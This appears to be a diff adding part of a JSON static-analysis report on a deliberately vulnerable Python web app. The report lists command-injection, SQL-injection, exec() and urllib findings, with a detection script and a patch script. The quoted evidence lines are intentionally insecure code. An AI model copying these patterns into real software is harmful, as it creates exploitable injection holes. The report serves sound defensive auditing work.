+      "description": "Found 'subprocess' function 'run' with 'shell=True'. This is dangerous because this call will spawn the command using a shell process. Doing so propagates current shell settings and variables, which makes it much easier for a malicious actor to execute commands. Use 'shell=False' instead.",
+      "severity": "HIGH",
+      "cvss": 8.0,
+      "file": "dsvw.py",
+      "line": 39,
+      "evidence": "content = subprocess.run(\"nslookup \" + params[\"domain\"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, text=True).stdout",
+      "fix": "False",
+      "references": [
+        "https://stackoverflow.com/questions/3172470/actual-meaning-of-shell-true-in-subprocess",
+        "https://docs.python.org/3/library/subprocess.html"
+      ],
+      "verified": false
+    },
+    {
+      "id": "0fba46b4-0690-4198-a9a0-13dc9647073e",
+      "rule_id": "python.lang.security.audit.formatted-sql-query.formatted-sql-query",
+      "tool": "opengrep",
+      "category": "sast",
+      "title": "formatted-sql-query",
+      "description": "Detected possible formatted SQL query. Use parameterized queries instead.",
+      "severity": "MEDIUM",
+      "cvss": 5.5,
+      "file": "dsvw.py",
+      "line": 50,
+      "evidence": "cursor.execute(\"INSERT INTO comments VALUES(NULL, '%s', '%s')\" % (params[\"comment\"], time.ctime()))",
+      "fix": "Consult documentation.",
+      "references": [
+        "https://stackoverflow.com/questions/775296/mysql-parameterized-queries"
+      ],
+      "verified": false
+    },
+    {
+      "id": "d8b4b6e2-84d2-4703-bdf1-ec6016a0e54f",
+      "rule_id": "python.sqlalchemy.security.sqlalchemy-execute-raw-query.sqlalchemy-execute-raw-query",
+      "tool": "opengrep",
+      "category": "sast",
+      "title": "sqlalchemy-execute-raw-query",
+      "description": "Avoiding SQL string concatenation: untrusted input concatenated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complex SQL composition, use SQL Expression Language or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option.",
+      "severity": "HIGH",
+      "cvss": 8.0,
+      "file": "dsvw.py",
+      "line": 50,
+      "evidence": "cursor.execute(\"INSERT INTO comments VALUES(NULL, '%s', '%s')\" % (params[\"comment\"], time.ctime()))",
+      "fix": "Consult documentation.",
+      "references": [
+        "https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-textual-sql",
+        "https://www.tutorialspoint.com/sqlalchemy/sqlalchemy_quick_guide.htm",
+        "https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-more-specific-text-with-table-expression-literal-column-and-expression-column"
+      ],
+      "verified": false
+    },
+    {
+      "id": "8b9993e3-2139-4a93-941a-34217191eed3",
+      "rule_id": "python.lang.security.audit.dynamic-urllib-use-detected.dynamic-urllib-use-detected",
+      "tool": "opengrep",
+      "category": "sast",
+      "title": "dynamic-urllib-use-detected",
+      "description": "Detected a dynamic value being used with urllib. urllib supports 'file://' schemes, so a dynamic value controlled by a malicious actor may allow them to read arbitrary files. Audit uses of urllib calls to ensure user data cannot control the URLs, or consider using the 'requests' library instead.",
+      "severity": "MEDIUM",
+      "cvss": 5.5,
+      "file": "dsvw.py",
+      "line": 56,
+      "evidence": "backup, sys.stdout, program, envs = sys.stdout, io.StringIO(), (open(params[\"include\"], \"rb\") if not \"://\" in params[\"include\"] else urllib.request.urlopen(params[\"include\"])).read(), {\"DOCUMENT_ROOT\": os.getcwd(), \"HTTP_USER_AGENT\": self.headers.get(\"User-Agent\"), \"REMOTE_ADDR\": self.client_address[0], \"REMOTE_PORT\": self.client_address[1], \"PATH\": path, \"QUERY_STRING\": query}",
+      "fix": "Consult documentation.",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/939.html"
+      ],
+      "verified": true,
+      "wargame_status": "Neutralized",
+      "ai_reasoning": "The code accepts arbitrary query parameters and passes them directly to several dangerous sinks. The 'domain' parameter is concatenated into a shell command (nslookup ...) with shell=True, allowing command injection. The 'xml' parameter is parsed with lxml using `load_dtd=True` and `resolve_entities=True`, exposing an XXE vulnerability. Additionally, the 'path' parameter allows arbitrary file reads. These unvalidated inputs reach unsafe functions, making the finding exploitable.",
+      "poc_script": "import sys\nimport ast\n\n# Validation for dynamic-urllib-use-detected:\n# Detect urllib.request.urlopen called with a value taken directly from user-controlled dict (e.g., params['...']).\n\nSOURCE_FILE = \"/src/dsvw.py\"\n\ndef is_urllib_urlopen(node):\n    \"\"\"Return True if the Call node is urllib.request.urlopen.\"\"\"\n    # Must be a Call where func is an Attribute chain: urllib.request.urlopen\n    if not isinstance(node, ast.Call):\n        return False\n    func = node.func\n    if not isinstance(func, ast.Attribute) or func.attr != \"urlopen\":\n        return False\n    # func.value should be an Attribute named 'request'\n    request_attr = func.value\n    if not isinstance(request_attr, ast.Attribute) or request_attr.attr != \"request\":\n        return False\n    # request_attr.value should be Name 'urllib'\n    if not isinstance(request_attr.value, ast.Name) or request_attr.value.id != \"urllib\":\n        return False\n    return True\n\ndef arg_is_user_input(arg):\n    \"\"\"Return True if the argument originates from the 'params' dict (subscript or .get).\"\"\"\n    # params['key']\n    if isinstance(arg, ast.Subscript):\n        if isinstance(arg.value, ast.Name) and arg.value.id == \"params\":\n            return True\n    # params.get('key')\n    if isinstance(arg, ast.Call):\n        if isinstance(arg.func, ast.Attribute):\n            if arg.func.attr == \"get\" and isinstance(arg.func.value, ast.Name) and arg.func.value.id == \"params\":\n                return True\n    return False\n\ndef check_vuln(tree):\n    for node in ast.walk(tree):\n        if isinstance(node, ast.Call) and is_urllib_urlopen(node):\n            if node.args:\n                if arg_is_user_input(node.args[0]):\n                    return True\n    return False\n\ndef main():\n    try:\n        with open(SOURCE_FILE, \"r\", encoding=\"utf-8\") as f:\n            source = f.read()\n        tree = ast.parse(source, filename=SOURCE_FILE)\n        if check_vuln(tree):\n            print(\"VALIDATION_SUCCESS: urllib.request.urlopen receives unsanitized user input.\")\n            sys.exit(0)\n    except Exception as e:\n        print(f\"VALIDATION_ERROR: {e}\", file=sys.stderr)\n\n    sys.exit(1)\n\nif __name__ == \"__main__\":\n    main()",
+      "patch_code": "import os\nimport re\n\n# ----------------------------------------------------------------------\n# Aurix Blue \u2013 Patch script to mitigate dynamic urllib usage in dsvw.py\n# ----------------------------------------------------------------------\n# Vulnerability: urllib.request.urlopen is called directly with user\u2011controlled\n# input (e.g., params['path'] or params.get('path')). This allows SSRF attacks.\n# Fix: Introduce a validated wrapper `safe_urlopen` that only permits http/https\n# URLs and replace unsafe calls with this wrapper.\n# ----------------------------------------------------------------------\n\nTARGET_FILE = \"/src/dsvw.py\"\n\ndef ensure_helper(content: str) -> str:\n    \"\"\"\n    Insert the safe_urlopen helper function after the last import statement\n    if it is not already present.\n    \"\"\"\n    helper_code = '''\ndef safe_urlopen(url):\n    \"\"\"\n    Validate the URL and open it safely.\n    Only http and https schemes are allowed.\n    \"\"\"\n    from urllib.parse import urlparse\n    parsed = urlparse(url)\n    if parsed.scheme not in (\"http\", \"https\"):\n        raise ValueError(\"Unsupported URL scheme: %s\" % parsed.scheme)\n    return urllib.request.urlopen(url)\n'''\n    if \"def safe_urlopen\" in content:\n        return content  # already present\n\n    # Find the last import line\n    import_lines = list(re.finditer(r'^(import .+|from .+ import .+)$', content, re.MULTILINE))\n    if not import_lines:\n        # No imports \u2013 prepend at the top\n        return helper_code + \"\\n\" + content\n\n    last_import = import_lines[-1]\n    insert_pos = last_import.end()\n    # Preserve a blank line after imports\n    return content[:insert_pos] + \"\\n\" + helper_code + content[insert_pos:]\n\ndef replace_unsafe_calls(content: str) -> str:\n    \"\"\"\n    Replace urllib.request.urlopen calls that receive user input directly.\n    Handles:\n        urllib.request.urlopen(params['path'])\n        urllib.request.urlopen(params.get('path'))\n    with:\n        safe_urlopen(params['path'])\n        safe_urlopen(params.get('path'))\n    \"\"\"\n    pattern = re.compile(\n        r'urllib\\.request\\.urlopen\\s*\\(\\s*params\\s*\\[\\s*([\\'\"]\\w+[\\'\"])\\s*\\]\\s*\\)',\n        re.IGNORECASE\n    )\n    content = pattern.sub(r'safe_urlopen(params[\\1])', content)\n\n    pattern_get = re.compile(\n        r'urllib\\.request\\.urlopen\\s*\\(\\s*params\\.get\\s*\\(\\s*([\\'\"]\\w+[\\'\"])\\s*\\)\\s*\\)',\n        re.IGNORECASE\n    )\n    content = pattern_get.sub(r'safe_urlopen(params.get(\\1))', content)\n\n    return content\n\ndef main():\n    if not os.path.isfile(TARGET_FILE):\n        print(f\"PATCH_ERROR: Target file not found: {TARGET_FILE}\")\n        return\n\n    with open(TARGET_FILE, \"r\", encoding=\"utf-8\") as f:\n        original = f.read()\n\n    # Step 1: Ensure the safe_urlopen helper exists\n    patched = ensure_helper(original)\n\n    # Step 2: Replace unsafe urllib calls\n    patched = replace_unsafe_calls(patched)\n\n    if patched == original:\n        print(\"PATCH_INFO: No vulnerable urllib.request.urlopen patterns detected.\")\n        return\n\n    with open(TARGET_FILE, \"w\", encoding=\"utf-8\") as f:\n        f.write(patched)\n\n    print(\"PATCH_APPLIED: Dynamic urllib usage sanitized with safe_urlopen wrapper.\")\n\nif __name__ == \"__main__\":\n    main()"
+    },
+    {
+      "id": "a5c7ec6f-bf80-4eed-bc73-1e3db56cf54d",
+      "rule_id": "python.lang.security.audit.exec-detected.exec-detected",
+      "tool": "opengrep",
+      "category": "sast",
+      "title": "exec-detected",
+      "description": "Detected the use of exec(). exec() can be dangerous if used to evaluate dynamic content. If this content can be input from outside the program, this may be a code injection vulnerability. Ensure evaluated content is not definable by external sources.",
+      "severity": "MEDIUM",
+      "cvss": 5.5,
+      "file": "dsvw.py",
+      "line": 57,
+      "evidence": "exec(program, envs)",
+      "fix": "Consult documentation.",
+      "references": [
+        "https://owasp.org/Top10/A03_2021-Injection"
+      ],
+      "verified": false
+    },
+    {
+      "id": "2932ad81-60f3-46cd-af41-198c8b0870ae",
+      "rule_id": "python.sqlalchemy.security.sqlalchemy-execute-raw-query.sqlalchemy-execute-raw-query",
+      "tool": "opengrep",
+      "category": "sast",
+      "title": "sqlalchemy-execute-raw-query",
+      "description": "Avoiding SQL string concatenation: untrusted input concatenated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complex SQL composition, use SQL Expression Language or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option.",
+      "severity": "HIGH",
+      "cvss": 8.0,
+      "file": "dsvw.py",
+      "line": 67,
+      "evidence": "cursor.execute(\"SELECT * FROM users WHERE username='\" + re.sub(r\"[^\\w]\", \"\", params.get(\"username\", \"\")) + \"' AND password='\" + params.get(\"password\", \"\") + \"'\")",
+      "fix": "Consult documentation.",
+      "references": [
+        "https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-textual-sql",
+        "https://www.tutorialspoint.com/sqlalchemy/sqlalchemy_quick_guide.htm",
+        "https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-more-specific-text-with-table-expression-literal-column-and-expression-column"
+      ],
+      "verified": false
+    },
+    {
+      "id": "DL3018",
+      "tool": "hadolint",
+      "category": "infra",
+      "title": "Docker Best Practice: DL3018",
+      "description": "Pin versions in apk add. Instead of `apk add <package>` use `apk add <package>=<version>`",
+      "severity": "MEDIUM",
+      "cvss": 3.0,
+      "file": "/src/Dockerfile",
+      "line": 5,
+      "evidence": "DL3018",
+      "fix": "Refactor Dockerfile instruction.",
+      "references": [],
+      "verified": false
+    },
+    {
+      "id": "DL3042",
+      "tool": "hadolint",
+      "category": "infra",
+      "title": "Docker Best Practice: DL3042",
+      "description": "Avoid use of cache directory with pip. Use `pip install --no-cache-dir <package>`",
+      "severity": "MEDIUM",
+      "cvss": 3.0,
+      "file": "/src/Dockerfile",
+      "line": 7,
+      "evidence": "DL3042",
+      "fix": "Refactor Dockerfile instruction.",
+      "references": [],
+      "verified": false
+    }
+  ]
+}
